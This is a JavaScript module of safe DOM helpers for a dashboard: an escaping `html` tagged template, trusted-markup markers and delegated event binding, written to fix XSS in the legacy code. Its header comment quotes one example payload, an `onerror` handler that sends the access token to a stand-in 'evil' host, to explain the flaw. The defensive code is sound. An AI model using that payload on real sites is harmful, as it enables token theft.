// Safe DOM construction.
//
// The legacy dashboard built every list, table and card by interpolating API
// strings straight into `innerHTML`. Workflow names, branch names and repo
// descriptions are all attacker-controllable in any repository the token can
// read, so a branch called `<img src=x onerror=fetch('//evil/'+token)>` executed
// with the PAT in scope. Everything now goes through `html`, which escapes each
// interpolated value unless it is explicitly marked trusted with `raw`.

const ESCAPES = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };

/** Escape a value for interpolation into HTML text or a quoted attribute. */
export function esc(value) {
  if (value === null || value === undefined) return '';
  return String(value).replace(/[&<>"']/g, (c) => ESCAPES[c]);
}

/** Marker for pre-escaped markup. Never construct one from untrusted input. */
export class TrustedHtml {
  constructor(value) {
    this.value = String(value);
  }

  toString() {
    return this.value;
  }
}

/** Mark a string as already-safe markup. */
export function raw(value) {
  return new TrustedHtml(value);
}

function interpolate(value) {
  if (value instanceof TrustedHtml) return value.value;
  if (Array.isArray(value)) return value.map(interpolate).join('');
  if (value === null || value === undefined || value === false) return '';
  if (value === true) return '';
  return esc(value);
}

/**
 * Tagged template that escapes every interpolation.
 *
 *   html`<td>${run.branch}</td>`            // escaped
 *   html`<td>${raw(prebuiltMarkup)}</td>`   // passed through
 *   html`<ul>${items.map(li)}</ul>`         // arrays are joined
 */
export function html(strings, ...values) {
  let out = strings[0];
  for (let i = 0; i < values.length; i += 1) {
    out += interpolate(values[i]) + strings[i + 1];
  }
  return new TrustedHtml(out);
}

/** Join a list of TrustedHtml chunks. */
export function join(chunks, separator = '') {
  return raw(chunks.map(interpolate).join(separator));
}

/* ------------------------------------------------------------------ */
/* Browser-only helpers. Guarded so the module stays importable in Node. */
/* ------------------------------------------------------------------ */

export function $(selector, root) {
  return (root || document).querySelector(selector);
}

export function $$(selector, root) {
  return Array.from((root || document).querySelectorAll(selector));
}

export function byId(id) {
  return document.getElementById(id);
}

/** Replace an element's contents with trusted markup. */
export function setHtml(target, content) {
  const el = typeof target === 'string' ? byId(target) : target;
  if (!el) return null;
  el.innerHTML = content instanceof TrustedHtml ? content.value : interpolate(content);
  return el;
}

/** Set text content, creating no markup at all. */
export function setText(target, text) {
  const el = typeof target === 'string' ? byId(target) : target;
  if (!el) return null;
  el.textContent = text === null || text === undefined ? '' : String(text);
  return el;
}

export function show(target, visible) {
  const el = typeof target === 'string' ? byId(target) : target;
  if (el) el.style.display = visible ? '' : 'none';
  return el;
}

/**
 * Delegated event binding. Replaces the inline `onclick="fn('${value}')"`
 * handlers, which both required globals and formed a second injection sink.
 *
 * The handler receives (event, matchedElement).
 */
export function delegate(root, eventName, selector, handler) {
  const el = typeof root === 'string' ? byId(root) : root;
  if (!el) return () => {};
  const listener = (event) => {
    const match = event.target.closest(selector);
    if (match && el.contains(match)) handler(event, match);
  };
  el.addEventListener(eventName, listener);
  return () => el.removeEventListener(eventName, listener);
}

/** Treat Enter/Space on a role="button" element as a click. */
export function activatable(root, selector, handler) {
  delegate(root, 'click', selector, handler);
  delegate(root, 'keydown', selector, (event, match) => {
    if (event.key === 'Enter' || event.key === ' ') {
      event.preventDefault();
      handler(event, match);
    }
  });
}
